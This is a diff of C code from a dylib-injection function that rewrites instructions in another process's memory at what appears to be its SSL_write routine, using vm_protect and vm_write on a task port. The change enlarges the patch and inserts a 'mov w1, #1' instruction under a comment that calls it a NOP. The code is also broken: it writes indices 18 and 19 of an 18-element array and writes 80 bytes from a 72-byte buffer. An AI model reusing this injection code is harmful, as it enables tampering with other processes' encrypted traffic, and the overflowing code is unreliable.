@@ -593,14 +593,14 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 		}
 
 		// Make writable
-		kr = vm_protect(task, sslWriteAddr, 64, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+		kr = vm_protect(task, sslWriteAddr, 80, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
 		if (kr != KERN_SUCCESS) {
 			printf("[ERROR] Failed to set memory writable: %s\n", mach_error_string(kr));
 			return;
 		}
 
 		// Patch to: add NOP instructions without breaking the function
-		uint32_t nop_patch[16];
+		uint32_t nop_patch[18];
 
 		// Only replace instructions that are safe to modify
 		nop_patch[0] = original_bytes[0]; 
@@ -618,19 +618,23 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 		nop_patch[12] = original_bytes[12]; 
 		nop_patch[13] = original_bytes[13]; 
 		nop_patch[14] = original_bytes[14]; 
-		nop_patch[15] = original_bytes[15];        
+		nop_patch[15] = original_bytes[15]; 
+		nop_patch[16] = original_bytes[16]; 
+		nop_patch[17] = original_bytes[17];    
+		nop_patch[18] = 0x52800021;    
+		nop_patch[19] = original_bytes[19];        
 
-		kr = vm_write(task, sslWriteAddr, (vm_offset_t)nop_patch, 64);
+		kr = vm_write(task, sslWriteAddr, (vm_offset_t)nop_patch, 80);
 		if (kr != KERN_SUCCESS) {
 			printf("[ERROR] Failed to write NOP patch: %s\n", mach_error_string(kr));
 
 			// Restore original bytes if patch fails
-			vm_write(task, sslWriteAddr, (vm_offset_t)original_bytes, 64);
+			vm_write(task, sslWriteAddr, (vm_offset_t)original_bytes, 80);
 			return;
 		}
 
 		// Restore executable
-		kr = vm_protect(task, sslWriteAddr, 64, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+		kr = vm_protect(task, sslWriteAddr, 80, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 		if (kr != KERN_SUCCESS) {
 			printf("[ERROR] Failed to restore memory protection: %s\n", mach_error_string(kr));
 			return;
